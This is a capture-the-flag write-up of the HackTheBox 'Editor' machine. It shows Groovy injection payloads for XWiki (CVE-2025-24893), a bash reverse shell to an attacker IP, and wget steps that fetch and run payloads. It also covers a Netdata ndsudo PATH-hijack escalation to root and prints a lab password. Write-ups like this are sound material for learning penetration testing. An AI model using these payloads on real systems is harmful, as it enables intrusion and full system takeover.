# HackTheBox - Editor Writeup

## Initial Reconnaissance

### Nmap Scan
```bash
nmap -Pn -p22,80,8080 -sC -sV 10.10.11.80
```

**Results:**
- **Port 22**: SSH (OpenSSH 8.9p1)
- **Port 80**: nginx 1.18.0 (Ubuntu) - "Editor - SimplistCode Pro"
- **Port 8080**: Jetty 10.0.20 with XWiki
  - WebDAV enabled (PROPFIND, LOCK, UNLOCK methods)
  - Redirects to `/xwiki/bin/view/Main/`

### Key Findings
- XWiki application running on port 8080
- WebDAV capabilities present
- Hosts file reveals: `editor.htb`, `wiki.editor.htb`

## Initial Access - XWiki RCE

### Vulnerability: CVE-2025-24893
XWiki Platform 15.10.10 suffers from a critical Remote Code Execution vulnerability in the SolrSearch endpoint, allowing guest users to execute arbitrary Groovy code.

### Exploitation

1. **Initial Command Execution Test:**
```bash
# URL-encoded payload for: whoami
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22whoami%22.execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

2. **Reverse Shell via File Download:**
The key insight is to use `wget` to download shell scripts rather than trying to inject complex payloads directly through URL encoding.

**Step 1: Create shell script locally:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
```

**Step 2: Host HTTP server:**
```bash
python3 -m http.server 80
```

**Step 3: Download and execute via XWiki:**
```bash
# Download shell script
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln("wget%20-qO%20/tmp/shell.sh%20http://10.10.14.12/shell.sh".execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D

# Make executable
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln("chmod%20+x%20/tmp/shell.sh".execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D

# Execute
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln("/tmp/shell.sh".execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

**Result:** Shell as `xwiki` user

## Lateral Movement - Database Credentials

### XWiki Configuration Discovery
```bash
find /var/lib/xwiki -name "hibernate.cfg.xml" 2>/dev/null
cat /var/lib/xwiki/data/hibernate.cfg.xml
```

**Found credentials:**
- Username: `xwiki`
- Password: `theEd1t0rTeam99`

### SSH Access
The database password works for SSH access:
```bash
ssh oliver@editor.htb
# Password: theEd1t0rTeam99
```

**Note:** While `su oliver` failed from the xwiki shell, SSH login worked due to different PAM authentication configurations.

## Privilege Escalation - Netdata SUID Exploitation

### Vulnerability: CVE-2024-32019 (GHSA-pmhq-4cxq-wj93)
Netdata v1.45.2 contains a local privilege escalation vulnerability in the `ndsudo` binary via untrusted search path.

### Discovery
```bash
find / -perm -4000 2>/dev/null | grep netdata
# Found: /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo (SUID root)

/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help
```

### Critical Exploitation Detail: Why C Program vs Bash Script

**The vulnerability requires a compiled C program, not a shell script. Here's why:**

#### Shell Scripts Fail:
- Modern systems **drop SUID privileges** when executing shell scripts for security
- The bash script would run as the real user (oliver), not root
- Even `bash -p` gets blocked by security protections
- Shell interpreters have built-in protections against SUID escalation

#### C Programs Succeed:
- Compiled binaries properly **inherit the SUID context**
- System calls like `setuid(0)` and `setgid(0)` work when you have effective root privileges
- No interpreter security restrictions to bypass
- Direct system calls provide reliable privilege escalation

### Exploitation Steps

1. **Create malicious C program locally:**
```c
// malicious.c
#include <unistd.h>
#include <stdlib.h>
int main() {
  setuid(0);   // Set real user ID to root
  setgid(0);   // Set real group ID to root
  execl("/bin/bash", "bash", "-i", NULL);
  return 0;
}
```

2. **Compile and serve:**
```bash
gcc -o nvme malicious.c
python3 -m http.server 80
```

3. **Download and execute on target:**
```bash
cd /tmp
wget http://10.10.14.12/nvme
chmod +x nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

**Result:** Root shell

### Technical Details
- `ndsudo` searches for executables using the `PATH` environment variable
- By placing our malicious `nvme` binary in `/tmp` and prepending `/tmp` to `PATH`
- When `ndsudo nvme-list` executes, it finds our fake `nvme` instead of the real one
- Our C program runs with SUID root privileges and properly escalates to root

## Lessons Learned

1. **File Download > Direct Injection:** Complex payloads should be downloaded rather than URL-encoded
2. **PAM Differences:** SSH and `su` may use different authentication backends
3. **SUID Exploitation:** Always use compiled C programs for reliable SUID privilege escalation
4. **Path Manipulation:** SUID binaries that use `PATH` are prime targets for privilege escalation

## Flags

- **User Flag:** `/home/oliver/user.txt`
- **Root Flag:** `/root/root.txt`

## Timeline

1. Nmap scan reveals XWiki on port 8080
2. XWiki RCE (CVE-2025-24893) → `xwiki` user shell
3. Database credentials found in hibernate.cfg.xml
4. SSH as `oliver` using database password
5. Netdata SUID exploitation (CVE-2024-32019) → root shell

## IOCs

- XWiki version 15.10.10 (vulnerable to CVE-2025-24893)
- Netdata version 1.45.2 (vulnerable to CVE-2024-32019)
- Password reuse: database credentials used for SSH access
- SUID binaries in `/opt/netdata/usr/libexec/netdata/plugins.d/`